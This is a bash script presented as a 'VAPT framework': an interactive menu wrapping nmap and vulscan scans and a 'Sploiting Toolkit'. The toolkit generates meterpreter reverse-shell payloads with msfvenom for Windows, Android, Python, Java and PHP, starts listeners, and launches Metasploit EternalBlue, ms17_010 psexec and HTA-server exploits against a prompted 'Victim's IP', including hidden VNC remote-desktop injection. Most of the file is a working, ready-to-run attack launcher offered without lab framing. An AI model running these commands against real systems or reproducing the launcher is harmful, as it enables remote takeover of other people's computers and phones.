clear 
echo Welcome to the VAPT framework! | boxes -d boy


 while :
	do

echo -e '\n \e[1;33m MAIN MENU \n'
echo -e '\e[0m 1. Network Scanning. \n 2. Vulnerability Scanning. \n 3. Sploiting Toolkit. \n 4. Quit.'
echo -n Please choose a tool from Above=;read tool

case ${tool} in 
   1)	clear	
	while :
	do
	echo Welcome to Network Scanning
	echo Select the Type of scan:-
	echo -e ' 1) Host scan. \n 2) TCP PortScan. \n 3) Service and Version Scan. \n 4) Return to Main Menu.'
	echo -n Please enter the option=;read option 
	
	case ${option} in 
	1)	clear
		echo Please enter the target;read target
		sudo nmap -sP ${target} -oN Results/HostResults.txt
		echo -e ' \n !!DONE!! \n '   	
	;;
   	2)  	clear
		echo Please enter the target;read target
		sudo nmap -sS ${target} -oN Results/TCPResults.txt
		echo -e ' \n !!DONE!! \n '   	
	;;
   	3)  	clear
		echo Please enter the target;read target
		sudo nmap -sV --version-intensity 5 ${target} -oN Results/VersionResults.txt
		echo -e ' \n !!DONE!! \n '
   	;;
	4)	clear
		break
	;;
    	*)  
      		echo "Please enter the valid option between 1 to 4 " 
      		exit 1 # Command to come out of the program with status 1
      	;; 
	esac
	done 
   ;;

   2)	clear
	while :
	do 
	echo Welcome to Vulnerability Scanning
	echo Choose the Type of scan you want to perform:
	echo -e ' 1) Remote system scan. \n 2) Local system scan. \n 3) Return to Main Menu.'
	echo -n Please enter the option=;read option
	
	case ${option} in
	1)	clear  
		echo Please enter the target;read target
		sudo nmap -sV -Pn --script vulscan/vulscan.nse ${target} -oN Results/VulscanResults.txt  		
		echo -e ' \n !!DONE!! \n '	
	;;
	2)  clear
		while :
		do  
		echo Please choose the scan you want to perform.
		echo -e ' 1) Perform Local scan using Verbose mode. \n 2) Only Scan For vulnerabilities that are Exploitable. \n 3) Exit.'
		echo -n Please enter the option=;read option

		case ${option} in
		1)	clear
			python3 vulmap.py -v 
			echo -e ' \n !!DONE!! \n '		
		;;
		2)	clear
			python3 vulmap.py -o 		 
			echo -e ' \n !!DONE!! \n '
		;;
		3)	clear
			break			 
		;;
		*) 	
			echo "Please enter the valid option between 1 to 4 " 
	      		exit 1 # Command to come out of the program with status 1
		;;
		esac 	
		done	
	;;
	3)  	clear
		break
	;;
	*)
	 	echo "Please enter the valid option between 1 to 4 " 
      		exit 1 
	;;
	esac
	done
   ;;
   3)  echo Sploiting Toolkit.
	while :
	do
	echo -n Press 1 to start exploiting or Press 2 to go back=;read option

case ${option} in

1)	#sploitBEGIN	

i="0"
#resize -s 27 80
clear
while [ $i -lt 1 ]
do
#clear
ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')

#\e[1;33m
 echo -e SPLOITS: '
(1) Windows --> test.exe (payload and listener) 
(2) Android --> test.apk (payload and listener)  
(3) Linux --> test.py (payload and listener) 
(4) MacOS --> test.jar (payload and listener)
(5) Web --> test.php (payload and listener)
(6) Scan if a target is vulnerable to ms17_010
(7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)
(7rd) Enable Remote Desktop (ms17_010_eternalblue)
(8) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) 
(8rd) Enable Remote Desktop (ms17_010_psexec)
(9) Exploit Windows with a link (HTA Server)
(10) BACK
'
 
service postgresql start
exe='1'
apk='2'
py='3'
jar='4' 
php='5'
scan='6'
eternalblue='7'
eternalbluerd='7rd'
psexec='8'
psexecrd='8rd'
hta='9'
bck='10'




read x

if [ "$x" == "$exe" ]; then                    #EXE
msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/test.exe
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"


elif [ "$x" == "$apk" ]; then                          #APK
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.apk
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"




elif [ "$x" == "$py" ]; then                       #PYTHON
msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.py
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.py!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"



elif [ "$x" == "$jar" ]; then                        #JAVA
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/test.jar
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.jar!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"






elif [ "$x" == "$php" ]; then                        #PHP
msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.php
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.php!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"




elif [ "$x" == "$scan" ]; then                        #SCAN
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


elif [ "$x" == "$eternalblue" ]; then                        #ETERNALBLUE
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "



elif [ "$x" == "$eternalbluerd" ]; then                        #ETERNALBLUERD
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "




elif [ "$x" == "$psexec" ]; then                        #PSEXEC
echo "Victim's IP:" 
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"


elif [ "$x" == "$psexecrd" ]; then                        #PSEXECRD
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "



elif [ "$x" == "$hta" ]; then                        #HTA
echo 'Uripath: (/)'
read u
msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"

                     

elif [ "$x" == "$bck" ]; then                        #HTA
break

#echo 'Uripath: (/)'
#read u
#msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"

clear

echo -e '

                          Press ENTER to Main Menu
'
read


else 

n


fi

done

	#sploitEND
	;;
	
2)	echo Back to Menu.
	break
	;;
esac
done
  ;;

			

   4)  clear
	echo "Thankyou for using VAPT!" | boxes -d boy
	break
   ;;
    *)  
      echo "Please enter the valid option between 1 to 4 " 
      exit 1 # Command to come out of the program with status 1
      ;; 
esac
done
